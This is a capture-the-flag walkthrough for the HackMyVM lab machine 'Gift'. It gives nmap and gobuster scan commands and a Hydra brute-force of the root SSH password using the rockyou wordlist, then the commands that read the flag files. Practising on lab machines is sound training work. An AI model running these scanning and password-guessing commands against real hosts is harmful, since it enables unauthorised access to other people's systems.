# Gift

![image](https://user-images.githubusercontent.com/44063862/95709656-af8d5b00-0c91-11eb-847e-d7f76afa6715.png)

## :link: Link 

[Gift](https://hackmyvm.eu/machines/machine.php?vm=Gift)

## Penetration Testing Methodology

**Reconnaissance**
* nmap

**Exploitation**
* Hydra

**Capturing the flag**
* User.txt
* Root.txt

_______________________________________________________________________________________________________

## Walkthrough

```
netdiscover
```

![image](https://user-images.githubusercontent.com/44063862/95709799-009d4f00-0c92-11eb-845d-c300d0f20c7a.png)

```
nmap -A -Pn 192.168.186.131
```

![image](https://user-images.githubusercontent.com/44063862/95711421-50c9e080-0c95-11eb-83eb-5da4ead99519.png)

From the nmap scanning. I found that 3 port open. Which is
* 22 (ssh)
* 80 (http)

I browse the given IP address.

![image](https://user-images.githubusercontent.com/44063862/95711504-7951da80-0c95-11eb-9c23-d9f32588180f.png)

And view the page source

![image](https://user-images.githubusercontent.com/44063862/95711547-8e2e6e00-0c95-11eb-8e87-e5c77cad5309.png)

But, I don't get anything from the websites. 

I decided to use gobuster against the ip.

```
gobuster dir -u http://192.168.186.131/ -w /root/Lists/directory-list-2.3-medium.txt -t 80 -x .txt,.php,.html,.pdf,.doc,.zip
```

![image](https://user-images.githubusercontent.com/44063862/95711644-cc2b9200-0c95-11eb-8b8d-35b16536264e.png)

Well, nothing... 

I'm stucked.. We only have 2 port opened which is 22 and 80. But, I don't get anything from the port 80. What can i do?

BRUTE-FORCE!!

I will be using hydra and as root (as we do not have any other username).

```
hydra -t 64 -P /root/Lists/rockyou.txt -l root ssh://192.168.186.131
```

![image](https://user-images.githubusercontent.com/44063862/95711873-3fcd9f00-0c96-11eb-91d4-bc6c5b7be359.png)

Okay we got the password. Let's get in.

Well:

```
whoami
ls
cat root.txt
cat user.txt
```

![image](https://user-images.githubusercontent.com/44063862/95712001-88855800-0c96-11eb-86c9-ecf70e8cef11.png)

Yeayyy, we got it. OMG! It is this simple??

CONGRATULATIONS!! Good for beginner.

Thank you for reading. :)

**By _AdaniKamal_**
